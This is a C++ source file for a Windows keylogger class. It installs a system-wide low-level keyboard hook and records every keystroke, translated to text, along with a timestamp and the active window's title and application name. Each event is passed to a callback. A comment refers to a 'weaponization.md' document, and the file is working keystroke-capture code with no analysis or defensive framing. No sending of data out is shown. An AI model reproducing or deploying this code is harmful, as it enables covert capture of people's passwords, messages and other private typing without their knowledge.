#ifdef _WIN32

#include <chrono>
#include <cstdio>
#include <string>
#include <psapi.h>

#include "keylogger_win.hpp"

// ---- VK translation --------------------------------------------------------

static std::string vkToString(DWORD vk, DWORD scanCode) {
    // Zero modifier state → always lowercase; see weaponization.md
    BYTE ks[256] = {};
    WCHAR wbuf[4] = {};
    int n = ToUnicodeEx(vk, scanCode, ks, wbuf, 4, 0, GetKeyboardLayout(0));
    if (n == 1 && wbuf[0] >= 0x20) {
        char utf8[8] = {};
        int len = WideCharToMultiByte(CP_UTF8, 0, wbuf, 1, utf8, sizeof(utf8) - 1, nullptr, nullptr);
        if (len > 0) return std::string(utf8, len);
    }
    switch (vk) {
        case VK_SPACE:                              return "[SPACE]";
        case VK_RETURN:                             return "[ENTER]";
        case VK_BACK:                               return "[BACKSPACE]";
        case VK_SHIFT:   case VK_LSHIFT:
        case VK_RSHIFT:                             return "[SHIFT]";
        case VK_CONTROL: case VK_LCONTROL:
        case VK_RCONTROL:                           return "[CTRL]";
        case VK_MENU:    case VK_LMENU:
        case VK_RMENU:                              return "[ALT]";
        case VK_TAB:                                return "[TAB]";
        case VK_ESCAPE:                             return "[ESC]";
        case VK_DELETE:                             return "[DELETE]";
        case VK_INSERT:                             return "[INSERT]";
        case VK_HOME:                               return "[HOME]";
        case VK_END:                                return "[END]";
        case VK_PRIOR:                              return "[PGUP]";
        case VK_NEXT:                               return "[PGDN]";
        case VK_LEFT:                               return "[LEFT]";
        case VK_RIGHT:                              return "[RIGHT]";
        case VK_UP:                                 return "[UP]";
        case VK_DOWN:                               return "[DOWN]";
        case VK_CAPITAL:                            return "[CAPS]";
        case VK_LWIN:    case VK_RWIN:              return "[WIN]";
        case VK_F1:                                 return "[F1]";
        case VK_F2:                                 return "[F2]";
        case VK_F3:                                 return "[F3]";
        case VK_F4:                                 return "[F4]";
        case VK_F5:                                 return "[F5]";
        case VK_F6:                                 return "[F6]";
        case VK_F7:                                 return "[F7]";
        case VK_F8:                                 return "[F8]";
        case VK_F9:                                 return "[F9]";
        case VK_F10:                                return "[F10]";
        case VK_F11:                                return "[F11]";
        case VK_F12:                                return "[F12]";
        default: {
            char tmp[12];
            snprintf(tmp, sizeof(tmp), "[VK_%02X]", static_cast<unsigned>(vk));
            return tmp;
        }
    }
}

// ---- active window info ----------------------------------------------------

struct WindowInfo { std::string app; std::string title; };

static std::string wideToUtf8(const WCHAR* ws, int len = -1) {
    if (!ws || (len == 0)) return {};
    if (len < 0) len = static_cast<int>(wcslen(ws));
    int n = WideCharToMultiByte(CP_UTF8, 0, ws, len, nullptr, 0, nullptr, nullptr);
    if (n <= 0) return {};
    std::string out(n, '\0');
    WideCharToMultiByte(CP_UTF8, 0, ws, len, &out[0], n, nullptr, nullptr);
    return out;
}

static WindowInfo getActiveWindowInfo() {
    WindowInfo info;
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return info;

    WCHAR titleBuf[512];
    int titleLen = GetWindowTextW(hwnd, titleBuf, 512);
    if (titleLen > 0)
        info.title = wideToUtf8(titleBuf, titleLen);

    DWORD pid = 0;
    GetWindowThreadProcessId(hwnd, &pid);
    if (pid) {
        HANDLE proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (proc) {
            WCHAR exePath[MAX_PATH];
            DWORD exeLen = MAX_PATH;
            if (QueryFullProcessImageNameW(proc, 0, exePath, &exeLen) && exeLen > 0) {
                const WCHAR* base = exePath;
                for (DWORD i = 0; i < exeLen; ++i) {
                    if (exePath[i] == L'\\' || exePath[i] == L'/')
                        base = exePath + i + 1;
                }
                std::string name = wideToUtf8(base);
                if (name.size() > 4) {
                    auto ext = name.substr(name.size() - 4);
                    if (ext == ".exe" || ext == ".EXE")
                        name.resize(name.size() - 4);
                }
                info.app = std::move(name);
            }
            CloseHandle(proc);
        }
    }
    return info;
}

static WindowInfo getCachedWindowInfo() {
    static HWND lastHwnd = nullptr;
    static WindowInfo cached;

    HWND hwnd = GetForegroundWindow();
    if (hwnd != lastHwnd) {
        cached = getActiveWindowInfo();
        lastHwnd = hwnd;
    } else {
        WCHAR titleBuf[512];
        int titleLen = GetWindowTextW(hwnd, titleBuf, 512);
        cached.title = (titleLen > 0) ? wideToUtf8(titleBuf, titleLen) : std::string{};
    }
    return cached;
}

// ---- global hook pointer ---------------------------------------------------

static WindowsKeylogger* g_instance = nullptr;

// ---- WindowsKeylogger ------------------------------------------------------

WindowsKeylogger::~WindowsKeylogger() { stop(); }

bool WindowsKeylogger::start() {
    if (m_running.exchange(true)) return true;
    g_instance = this;

    HANDLE ready = CreateEvent(nullptr, TRUE, FALSE, nullptr);
    if (!ready) { m_running = false; g_instance = nullptr; return false; }

    m_thread = std::thread([this, ready]() {
        m_threadId = GetCurrentThreadId();
        m_hook     = SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, nullptr, 0);
        m_hookOk   = (m_hook != nullptr);
        SetEvent(ready);
        if (m_hook) {
            MSG msg;
            while (GetMessage(&msg, nullptr, 0, 0) > 0) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
        }
    });

    WaitForSingleObject(ready, INFINITE);
    CloseHandle(ready);

    if (!m_hookOk) {
        m_running = false;
        if (m_thread.joinable()) m_thread.join();
        g_instance = nullptr;
        return false;
    }
    return true;
}

void WindowsKeylogger::stop() {
    if (!m_running.exchange(false)) return;
    if (m_hook) { UnhookWindowsHookEx(m_hook); m_hook = nullptr; }
    if (m_threadId) PostThreadMessage(m_threadId, WM_QUIT, 0, 0);
    if (m_thread.joinable()) m_thread.join();
    g_instance = nullptr;
}

void WindowsKeylogger::setEventCallback(std::function<void(const KeyEvent&)> cb) {
    std::lock_guard<std::mutex> lk(m_mu);
    m_callback = std::move(cb);
}

LRESULT CALLBACK WindowsKeylogger::hookProc(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION && g_instance) {
        auto* hs  = reinterpret_cast<KBDLLHOOKSTRUCT*>(lp);
        bool  down = (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN);

        KeyEvent ev;
        ev.virtualKey  = hs->vkCode;
        ev.translated  = vkToString(hs->vkCode, hs->scanCode);
        ev.timestampMs = static_cast<int64_t>(
            std::chrono::duration_cast<std::chrono::milliseconds>(
                std::chrono::system_clock::now().time_since_epoch()).count());
        ev.keyDown = down;

        auto wi = getCachedWindowInfo();
        ev.appName     = std::move(wi.app);
        ev.windowTitle = std::move(wi.title);

        std::lock_guard<std::mutex> lk(g_instance->m_mu);
        if (g_instance->m_callback) g_instance->m_callback(ev);
    }
    return CallNextHookEx(nullptr, code, wp, lp);
}

#endif // _WIN32
